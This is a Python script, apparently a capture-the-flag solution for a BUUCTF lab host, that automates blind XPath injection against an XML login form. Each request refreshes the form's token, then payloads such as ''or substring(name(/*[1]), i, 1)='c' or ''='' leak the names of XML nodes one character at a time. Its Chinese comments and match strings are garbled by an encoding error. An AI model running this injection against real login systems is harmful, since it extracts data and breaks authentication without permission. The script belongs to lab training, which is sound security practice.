# -*- coding: GB2312 -*-
import requests
import re
import time
sess=requests.session()
url="http://b40accfe-07c3-44c4-8f18-49bd77ad416c.node4.buuoj.cn:81/"
header={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Content-Type": "application/xml"
    }
find=re.compile('<input type="hidden" id="token" value="(.*?)" />')#����̰��ƥ��token��ֵ
strs="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
flag=''
for i in range(1,100):
    for j in strs:
            time.sleep(0.1)
            r=sess.post(url=url)
            token=find.findall(r.text)#�ҵ�token��ֵ��ֵ��token�ں�����и�ʽ���ַ���
            payload_1="<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])
            #root
            payload_2="<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])
            #accounts
            payload_3="<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])
            #user
            payload_4="<username>'or substring(name(/root/accounts/user/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])
            #id
            payload_5="<username>'or substring(name(/root/accounts/user/id/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])
            r=sess.post(url=url,headers=header,data=payload_1)
            print(r.text)
            if"�Ƿ�����" in r.text:
                flag+=j
                print(flag)
                break
    if"�û������������!" in r.text:
                break
print(flag)